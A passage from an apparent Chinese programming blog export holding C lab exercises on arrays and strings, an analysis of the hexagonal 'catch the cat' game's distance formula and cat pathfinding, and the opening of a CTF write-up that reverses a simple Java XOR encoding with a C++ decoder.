class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">func_xx</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="section-1">5790</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>m<span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//start    //end</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">func_xx</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func_xx</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//start</span>  <span class="token keyword">int</span> i<span class="token punctuation">,</span>temp<span class="token punctuation">,</span>max_pos<span class="token punctuation">,</span>min_pos<span class="token punctuation">;</span>     max_pos<span class="token operator">=</span>min_pos<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;</span>b<span class="token punctuation">[</span>max_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>        max_pos<span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>b<span class="token punctuation">[</span>min_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>          min_pos<span class="token operator">=</span>i<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   temp<span class="token operator">=</span>b<span class="token punctuation">[</span>max_pos<span class="token punctuation">]</span><span class="token punctuation">;</span>   b<span class="token punctuation">[</span>max_pos<span class="token punctuation">]</span><span class="token operator">=</span>b<span class="token punctuation">[</span>min_pos<span class="token punctuation">]</span><span class="token punctuation">;</span>   b<span class="token punctuation">[</span>min_pos<span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span> <span class="token comment">//end</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="section-2">5791</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">double</span> data<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> tmp<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span> <span class="token comment">//start </span> <span class="token comment">//end</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">func_sort</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.1lf "</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.1lf\n "</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func_sort</span><span class="token punctuation">(</span><span class="token keyword">double</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//start</span>     <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    <span class="token keyword">double</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      k<span class="token operator">=</span>i<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">&lt;</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>         k<span class="token operator">=</span>j<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">!=</span>i<span class="token punctuation">)</span>      <span class="token punctuation">{</span>          temp<span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>          a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>temp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//end</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实验12-函数-3">实验12 函数-3</h4><h5 id="section-3">5793</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="section-4">5794</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After Copy:%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="section-5">5795</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">strcmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="section-6">5796</h5><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 编程 </tag>
            
            <tag> C++ </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六边圈小猫游戏策略简要分析</title>
      <link href="/2021/11/10/quoridor-strategy/"/>
      <url>/2021/11/10/quoridor-strategy/</url>
      
        <content type="html"><![CDATA[<p><a href="http://ctf.nefu.edu.cn/games/catch-the-cat/">游戏链接</a></p><h3 id="坐标系选取">坐标系选取</h3><p>地图是一个平面六边点阵。（学过化学竞赛的同学应该对此比较熟悉）最小单位（晶胞/元胞）是一个点与和其联通的六个点的路径的一半。这么规定后，我们仅通过对最小单位进行平移操作就可以得到足够大（或无限大）的平面。</p><h3 id="在六边形网格上的两点最短距离公式及其推导">在六边形网格上的两点最短距离公式及其推导</h3><p>首先，距离公式应满足下列条件：</p><h4 id="始终存在最短路径">1. 始终存在最短路径</h4><p><img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/10/Ee7lTdyZnuzIFY6.png"></p><h4 id="点的联通情况">2. 点的联通情况</h4><p><img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/10/WpACqhNI4ouvD7r.png"></p><h4 id="距离公式的量纲应该是一次的且-x-y-应齐次">3.距离公式的量纲应该是一次的，且 <em>x, y</em> 应齐次</h4><p>我们现在觉得对于行的奇偶进行分类讨论比较繁琐</p><p>其实，它是一个仿三维距离公式的退化形式。</p><p>此处，我们不能只使用 <em>x, y</em>坐标，因为每隔一行移动半个正交单位基。</p><p>可以想象，每一个基底向量与六边形的边垂直。</p><p>我们的解决方案是添加第三个基底 <em>z</em>并使用三维<strong>斜</strong>交系来描述距离。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/10/wOAP8WuoLigzZlQ.png"></p><h4 id="对高中地理记忆残存的同学应该可以认出这和比率三角和六角图的原理是一致的恰恰因为地理中的三六角图所要表示的数据类型就是下图的形式">（对高中地理记忆残存的同学应该可以认出这和比率三角和六角图的原理是一致的，恰恰因为地理中的三/六角图所要表示的数据类型就是下图的形式）</h4><p><img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/10/nhpVxAul1XJNmIF.png"></p><h4 id="综上所述有距离公式">综上所述，有距离公式：</h4><p><img src="https://googles.plus/images/loading.gif" data-original="https://i.loli.net/2021/11/10/efxzXEwVckNyIuJ.png"></p><p>（有趣的是，这种定义下的从一点出发的等距点集全都在一个正六边形的边上，二维欧几里德空间有且只有一个圆）（我能说这是曼哈顿距离的拓展吗？）（薛定谔的猫会走出切比雪夫距离吗？）</p><h3 id="小猫的策略">小猫的策略</h3><p>非常遗憾，这是一只贪心猫。经过观察，我们发现：小猫总是会从当前点的联通邻居中选择最短路，递归执行，撞墙前或路线树根（这里不是指没有父亲的树根，而是指root节点所有只有一个子节点的连续的子节点们）被墙切割前不会反悔（即退回上一格）同时，当有多条最短路径时，小猫会选择距边缘相同距离下路线数最多的邻居。</p><p>在此前提下，如果仍有重复路线，反常的是，小猫 <strong>!不会!</strong>选择路径点下标排列中字典序最小的，而是会遵照正左，左上，右上，右，右下，左下，这一顺序。</p><p>显而易见的，如果无路可走，小猫会躺平并投降，此时游戏结束。</p><h3 id="小猫的反制策略">小猫的反制策略</h3><p>我们小猫很爱学习，它学会了A*搜索。</p><blockquote><p>A<em>搜索算法（A</em> searchalgorithm）是一种在图形平面上，有多个节点的路径，求出最低通过成本的算法。常用于游戏中的NPC的移动计算，或网络游戏的BOT的移动计算上。该算法综合了最良优先搜索和Dijkstra算法的优点：在进行启发式搜索提高算法效率的同时，可以保证找到一条最优路径（基于评估函数）。</p></blockquote><p>猫可以用Python中的pygame库（这里的地图数组压位降维了）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>    ways <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    gi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> gi<span class="token punctuation">:</span>        <span class="token keyword">if</span> crc<span class="token punctuation">.</span>is_crc_aly<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ways<span class="token punctuation">.</span>append<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> crc<span class="token punctuation">.</span>is_crc_aly<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ways<span class="token punctuation">.</span>append<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> crc<span class="token punctuation">.</span>is_crc_aly<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ways<span class="token punctuation">.</span>append<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> crc<span class="token punctuation">.</span>is_crc_aly<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ways<span class="token punctuation">.</span>append<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> crc<span class="token punctuation">.</span>is_crc_aly<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ways<span class="token punctuation">.</span>append<span class="token punctuation">(</span>crcs<span class="token punctuation">[</span>num<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ways<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="人类玩家是否一步也不能下错">人类玩家是否一步也不能下错？</h3><p>小猫主要面对着一个困境：被人类下套。即人类构建出一面有洞的墙，遗憾的是，由于小猫的寻路算法的第一排序项是距离，小猫总是会尝试钻洞，而人类玩家只需在其过洞前最后一步将洞封住就好。</p><p>考虑人在最后一步下错，肯定完蛋。</p><p>人在建墙犯错，此时要考虑猫的决策状态，如果猫经历了方向放弃，即上文的反悔，此时可以下错，其他情况下，基于距离公式可以说明，是不能犯错的。因为猫可以在向下(上)一行行动时，选择两个不同的横坐标，可以理解为不损失步数又进行左右平移。</p><h3 id="是否存在必胜策略">是否存在必胜策略？</h3><p>这个结论比较有名，</p><h4 id="结论在平面无限大的情况下人类玩家一定存在必胜策略">结论：在平面无限大的情况下，人类玩家一定存在必胜策略。</h4><p>证明后补。</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 数学 </tag>
            
            <tag> 博弈论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-java-xor WriteUp</title>
      <link href="/2021/11/10/buu-java-xor/"/>
      <url>/2021/11/10/buu-java-xor/</url>
      
        <content type="html"><![CDATA[<h3 id="java">JAVA</h3><p>一开始使用IDA查看，栈内操作比较复杂，再加上Optimized-out的东西较多，看不出来。后来使用<code>JD-GUI</code>，得到代码。 </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">Resultlist</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">^</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token class-name">Resultlist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>对字符串进行了加密操作。 一开始想当然的写出原文生成代码<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iomanip&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token 